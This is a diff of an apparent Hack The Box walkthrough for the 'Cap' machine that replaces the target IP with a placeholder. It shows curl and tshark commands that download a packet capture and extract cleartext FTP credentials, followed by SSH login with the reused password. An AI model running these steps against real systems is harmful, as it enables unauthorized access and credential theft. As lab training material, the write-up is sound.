@@ -1,6 +1,6 @@
 # Cap — HTB Walkthrough (professional pentest report)
 
-- **Target:** 10.129.106.230
+- **Target:** $TARGET
 - **Box:** Cap (easy, Linux / Ubuntu 20.04)
 - **Date:** 2026-09-30
 - **Result:** ✅ Fully compromised — user.txt + root.txt
@@ -43,7 +43,7 @@ Evidence: `nmap/allports.txt`, `nmap/services.txt`
 Downloaded capture 0 and extracted FTP auth (cleartext):
 
 ```bash
-curl -s http://10.129.106.230/download/0 -o loot/0.pcap
+curl -s http://$TARGET/download/0 -o loot/0.pcap
 tshark -r loot/0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg
 # USER nathan
 # PASS Buck3tH4TF0RM3!
@@ -52,7 +52,7 @@ tshark -r loot/0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg
 Credentials reused over SSH:
 
 ```bash
-ssh nathan@10.129.106.230   # password: Buck3tH4TF0RM3!
+ssh nathan@$TARGET   # password: Buck3tH4TF0RM3!
 id  # uid=1001(nathan) gid=1001(nathan)
 ```
 
